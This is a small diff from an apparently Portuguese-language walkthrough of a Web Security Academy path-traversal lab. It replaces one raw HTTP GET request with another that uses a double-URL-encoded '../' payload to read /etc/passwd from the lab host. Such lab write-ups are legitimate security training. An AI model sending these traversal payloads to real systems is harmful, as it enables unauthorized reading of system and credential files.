@@ -50,8 +50,8 @@ Connection: close
 Crie uma requisição GET contendo o caminho do arquivo a ser lido
 
 ````http
-GET /image?filename=....%2f%2f....%2f%2f....%2f%2fetc%2f%2fpasswd HTTP/1.1
-Host: acb61f3c1e42de95c004183200790000.web-security-academy.net
+GET /image?filename=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
+Host: ace71f641fb2b647c042061a009f000c.web-security-academy.net
 Accept-Encoding: gzip, deflate
 Accept: */*
 Accept-Language: en
